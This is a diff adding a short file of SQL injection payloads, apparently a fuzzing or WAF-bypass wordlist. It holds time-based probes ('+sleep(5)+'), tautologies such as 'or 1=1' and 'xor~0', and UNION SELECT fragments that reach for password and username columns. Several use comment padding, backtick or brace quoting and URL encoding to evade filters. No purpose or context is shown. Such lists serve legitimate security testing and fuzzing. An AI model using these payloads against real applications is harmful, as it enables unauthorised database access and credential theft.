@@ -1,0 +1,21 @@
+'%2bsleep(5)%2b'
+and 1=1
+and~~1=1
+and id like`1`
+or 1=1
+or~~1=1
+or id like`1`
+||1=1
+%26%261=1
+xor~0
+'xor~0
+user()
+.0union select
+union(select
+union( select
+union(select pass from(dual))
+select-1 from
+select@a:`pass`from
+select@name:=(username)from{x(adminuser)}
+union/*aaaaa%01bbb*/select
+union/*aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa*/select
